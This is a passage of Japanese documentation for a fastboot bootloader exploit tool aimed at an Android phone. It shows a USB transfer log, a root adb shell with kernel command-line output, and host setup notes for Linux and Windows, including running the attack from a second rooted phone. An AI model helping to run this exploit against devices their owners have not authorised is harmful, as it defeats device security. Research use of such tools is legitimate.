         {00b5a010->00b5a010:OK} 59 1f 61 6c 59 6f 33 62 20 57 62 8d 08 83 3e af "Y.alYo3b Wb...>.N...........zL..Zlsod..1.~..l..m..O....i..7.k.vk"
         {00000040<-00000004:OK} 4f 4b 41 59                                     "OKAY"
         {00000004->00000004:OK} 62 6f 6f 74                                     "boot"
         {00000040<-00000004:OK} 4f 4b 41 59                                     "OKAY"
   [+] test8 成功

.. raw:: html

   </details>

この場合は復号が動作しませんでしたが、adb シェルは使用できました。

.. raw:: html

   <details>
   <summary><a>adb シェル</a></summary>

.. code-block::

  akari:/ # uname -a
  Linux localhost 4.9.186-perf+ #1 SMP PREEMPT Thu Oct 2 22:00:09 2025 aarch64

  akari:/ # cat /proc/cmdline
  rcupdate.rcu_expedited=1 androidboot.selinux=permissive androidboot.console=ttyMSM0 androidboot.hardware=qcom androidboot.usbcontroller=a600000.dwc3 lpm_levels.sleep_disabled=1 msm_rtb.filter=0x237 service_locator.enable=1 swiotlb=2048 ehci-hcd.park=3 androidboot.configfs=true loop.max_part=7 panic_on_err=1 msm_drm.dsi_display0=dsi_panel_cmd_display:config0 zram.backend=z3fold video=vfb:640x400,bpp=32,memsize=3072000 twrpfastboot=1 buildvariant=userdebug androidboot.verifiedbootstate=green androidboot.keymaster=1 dm="1 vroot none ro 1,0 8127088 verity 1 PARTUUID=c351ca12-1a0f-43aa-911e-99daf8ba5dcd PARTUUID=c351ca12-1a0f-43aa-911e-99daf8ba5dcd 4096 4096 1015886 1015886 sha1 a16d90654215feadb5413403b2f72f007bdea3c1 aee087a5be3b982978c923f566a94613496b417f2af592639bc80d141e34dfe7 10 restart_on_corruption ignore_zero_blocks use_fec_from_device PARTUUID=c351ca12-1a0f-43aa-911e-99daf8ba5dcd fec_roots 2 fec_blocks 1023887 fec_start 1023887" root=/dev/dm-0 androidboot.vbmeta.device=PARTUUID=6995d1b0-2855-4d80-9e2b-9a386e09bd5e androidboot.vbmeta.avb_version=1.0 androidboot.vbmeta.device_state=locked androidboot.vbmeta.hash_alg=sha256 androidboot.vbmeta.size=3456 androidboot.vbmeta.digest=1504743017b278b3371f673ed3653b5766a47d152a13475c8ac3794b91f67861 androidboot.vbmeta.invalidate_on_error=yes androidboot.veritymode=enforcing androidboot.bootdevice=1d84000.ufshc androidboot.baseband=sdm lcdid_adc=1310806 androidboot.slot_suffix=_b skip_initramfs rootwait ro init=/init  oemandroidboot.imei=xxxxxxxxxxxxxx oemandroidboot.security=1 oemandroidboot.securityflags=0x00000002

.. raw:: html

   </details>


Linux ホストのセットアップ
--------------------------

このエクスプロイトは 16MB 以上の大きな USB 転送を使用する場合があります。これは
デフォルトではサポートされていない可能性があるため、大きな USB バッファの割り当て
をサポートするために Linux ディストロのカーネルにパッチを当てて再コンパイルする
必要があるかもしれません。カーネルパッチなしで実行すると以下のようなエラーが
表示される場合があります:

::

  [!] libusb_bulk_transfer 失敗: Insufficient memory ep=0x01 len=0xfff800 size=0xfff800
  [!] fbusb_bufcmd 送信失敗: reqsz=0xfff800 res=0xffffffff

カーネルのパッチ方法のリファレンスとして、このプロジェクトには
``misc/host-linux-kernel-x86-support-big-usb-transfers.patch`` が含まれています。

大きな USB 転送を有効にするために、以下のカーネルコマンドラインオプションが
追加で必要です:

::

  usbcore.usbfs_memory_mb=0

代替として、エクスプロイトの ``-b maxsize`` コマンドラインオプションで
小さい転送チャンクを使用してみることもできますが、エクスプロイト全体が
失敗する可能性があります。


Windows ホストのセットアップ
-----------------------------

Windows からエクスプロイトを使用するには、fastboot モードで電話にアクセス
できるよう、電話用の fastboot ドライバーをインストールする必要があるかも
しれません。

使い方は上記の Linux の例と同様ですが、``"oem unlock"`` のようにスペースを
含むコマンドには必ずダブルクォートを使用してください。


別の電話からの使用
------------------

USB-C アダプタ（および電源供給付き USB HUB）を使って2台の android 端末を
接続し、一方の端末の root シェルからエクスプロイトを実行してもう一方の
端末を攻撃することが可能です。ツールの ``aarch64`` クロスコンパイルビルドを
使用してください。「ホスト」端末の root シェルはフル root でも一時 root でも
構いません。
